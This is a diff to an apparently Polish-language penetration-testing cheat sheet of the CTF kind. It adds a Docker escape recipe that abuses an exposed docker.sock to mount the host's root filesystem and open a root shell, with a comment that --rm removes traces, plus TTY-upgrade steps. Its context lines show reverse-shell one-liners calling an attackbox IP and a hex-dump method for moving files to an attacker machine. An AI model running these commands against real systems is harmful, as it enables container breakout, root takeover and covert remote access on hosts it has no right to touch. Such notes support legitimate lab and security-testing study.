@@ -14,6 +14,10 @@ gobuster vhosts -u $4 -w /usr/share/wordlists/amass/subdomains-top1mil-5000.txt 
 ```
 sudo find / -name ".env.local" -type f 2>/dev/null
 ```
+Bez rozrozniania wielkosci liter
+```
+find . -iname "*monkey*"
+```
 ## Git
 Sprawdzajka dla zmian w plikach
 ```
@@ -153,6 +157,37 @@ xxd -p tajny_plik.zip > data.hex
 # Na maszynie atakującego:
 xxd -r -p data.hex > odzyskany_plik.zip
 ```
+### Docker Escape
+** 1. Usługa Dockera na hoście jest sterowana przez REST API które komunikuje się za pomocą pliku gniazda unixowego **
+```
+ls -la /var/run/docker.sock
+```
+```
+docker #sprawdzamy czy mamy zainstalowanego, jak nie to rzezbimy zadanie API recznie
+```
+Powinno wyświetlić listę wszystkich kontenerów działających na głównej maszynie
+```
+docker -H unix:///var/run/docker.sock ps
+# curl -s -X GET --unix-socket /var/run/docker.sock http://localhost/containers/json wersja z recznym api
+```
+Sprawdzamy jakie sa obrazy
+```
+docker -H unix:///var/run/docker.sock images
+# curl -s -X GET --unix-socket /var/run/docker.sock http://localhost/containers/json
+```
+Na podstawie znalezionych obrazow, mozemy w naszym kontenerze zamontowac zewnetrznego hosta
+```
+docker -H unix:///var/run/docker.sock run -it -v /:/mnt/matka --rm php:8.1-cli chroot /mnt/matka bash
+#php:8.1-cli to znaleziony obraz, a wiec otwieramy socketa, montujemy u nas w mnt/matka obraz php i otwieramy sobie basha jako root do niego, a --rm usuwa slady
+```
+Urzadzenia do mounta
+```
+lsblk #lub fdisk -l
+```
+Capabilities roota
+```
+capsh --print
+```
 ### Reverse Shell
 ```
 nc -e /bin/bash <attackbox_ip> <port>
@@ -161,8 +196,13 @@ socat TCP:10.20.20.20:2525 EXEC:'bash',pty,stderr,setsid,sigint,sane
 python3 -c '[...] s.connect(("10.30.30.30",80));pty.spawn("bash")'
 ```
 ### Interaktywny shell
+https://0xffsec.com/handbook/shells/full-tty/
 ```
 python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+CTRL+Z
+```
+stty raw -echo && fg
 ```
 ### Remote payload execution
 ```
